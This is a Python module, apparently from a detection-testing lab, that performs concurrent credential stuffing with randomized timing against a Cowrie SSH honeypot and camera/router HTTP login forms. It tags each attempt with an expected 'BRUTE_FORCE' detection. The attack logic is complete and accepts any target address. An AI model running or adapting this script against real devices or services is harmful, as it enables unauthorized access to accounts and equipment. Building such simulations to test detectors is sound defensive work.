"""Multi-threaded credential stuffing against Cowrie SSH and camera/router HTTP.

A real (bounded) username x password product, concurrent workers, randomized
inter-attempt jitter, and a configurable attempt cap. Non-adaptive: the attempt
list is fixed up front and does not change based on responses.

    python -m attacks.realistic.credential_stuffing --target 192.168.50.10 \
        --services ssh camera router --attempts 60 --workers 8
"""

import argparse
import random

from attacks.runner.run import ExpectedRejection, http_request, ssh_login

from .common import build_summary, credential_product, jitter_sleep, now_iso, resolve_target, run_pool, step

EXPECTED_DETECTION = "BRUTE_FORCE"
_HTTP_SERVICES = {"camera", "router", "http"}


def _attempt(target: str, service: str, username: str, password: str, number: int, jitter: float, seed: int):
    def task():
        started = now_iso()
        jitter_sleep(0, jitter, random.Random(seed + number))
        payload = {"username": username, "password": password}
        try:
            if service == "ssh":
                ssh_login(target, payload)
            else:
                http_request(target, service, {**payload, "auth_mode": "form", "path": "/login"})
            return step(number, service, "completed", started, f"{username}:{password} accepted")
        except ExpectedRejection as exc:
            return step(number, service, "rejected", started, f"{username}:{password} {exc}")
        except Exception as exc:
            return step(number, service, "failed", started, str(exc))

    return task


def run(target: str, *, services=("ssh",), attempts: int = 40, workers: int = 6, jitter: float = 0.4, seed: int = 1337) -> dict:
    target = resolve_target(target)
    pairs = credential_product(limit=attempts, seed=seed)
    start = now_iso()
    tasks = []
    number = 0
    for service in services:
        for username, password in pairs:
            number += 1
            tasks.append(_attempt(target, service, username, password, number, jitter, seed))
    steps = run_pool(tasks, workers)
    return build_summary(
        technique="credential-stuffing",
        target=target,
        expected_detection=EXPECTED_DETECTION,
        start_time=start,
        steps=steps,
        extra={"services": list(services), "workers": workers, "attempts_per_service": len(pairs)},
    )


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True)
    parser.add_argument("--services", nargs="+", default=["ssh"], choices=sorted({"ssh"} | _HTTP_SERVICES))
    parser.add_argument("--attempts", type=int, default=40, help="max credential pairs per service")
    parser.add_argument("--workers", type=int, default=6)
    parser.add_argument("--jitter", type=float, default=0.4, help="max random inter-attempt delay (seconds)")
    parser.add_argument("--seed", type=int, default=1337)
    args = parser.parse_args()
    import json

    summary = run(args.target, services=tuple(args.services), attempts=args.attempts, workers=args.workers, jitter=args.jitter, seed=args.seed)
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
